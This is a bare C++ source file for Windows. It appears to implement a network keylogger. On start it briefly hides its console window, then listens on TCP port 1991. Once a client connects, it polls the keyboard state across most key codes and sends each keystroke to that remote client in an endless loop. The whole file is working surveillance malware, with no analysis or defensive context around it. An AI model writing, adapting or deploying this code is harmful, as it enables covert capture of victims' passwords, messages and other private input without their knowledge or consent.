#if       _WIN32_WINNT < 0x0500
  #undef  _WIN32_WINNT
  #define _WIN32_WINNT   0x0500
#endif

#include <iostream>
#include <cstdio>
#include <string>
#include <winsock2.h>

int main(int argc, char *argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    Sleep(5000);
    ShowWindow(GetConsoleWindow(), SW_RESTORE);

    while(true)
    {
        WSADATA WsaDat;
        if(WSAStartup(MAKEWORD(2, 2), &WsaDat) != 0)
        {
            std::cerr << "Error: Winsock initialization failed" << std::endl;
            WSACleanup();
            return -1;
        }
        SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
        if(Socket==INVALID_SOCKET)
        {
            std::cerr << "Error: Socket creation failed" << std::endl;
            WSACleanup();
            return -1;
        }
        SOCKADDR_IN serverInf;
        serverInf.sin_family=AF_INET;
        serverInf.sin_addr.s_addr=INADDR_ANY;
        serverInf.sin_port=htons(1991);

        if(bind(Socket,(SOCKADDR*)(&serverInf),sizeof(serverInf))==SOCKET_ERROR)
        {
            std::cerr << "Unable to bind socket" << std::endl;
            WSACleanup();
            return -1;
        }

        listen(Socket, 1);
        SOCKET TempSock = SOCKET_ERROR;
        while(TempSock == SOCKET_ERROR)
        {
            std::cout << "Waiting for incoming connections..." << std::endl;
            TempSock=accept(Socket,NULL,NULL);
        }
        Socket = TempSock;
        std::cout << "Client connected!" << std::endl;
        char buffer[2];
        bool stop = false;

        while(!stop)
        {
            memset(buffer, '\0', sizeof(buffer) / sizeof(char));
            for(int i = 0x08; i <= 0xDF; i++)
            {
                if(GetAsyncKeyState(i) & 0x0001)
                {
                    buffer[0] = (char) i;
                    if(send(Socket, buffer, 1, 0) == SOCKET_ERROR)
                        stop = true;
                }
            }
        }

        shutdown(Socket, SD_SEND);
        closesocket(Socket);
        WSACleanup();
    }

    return 0;
}
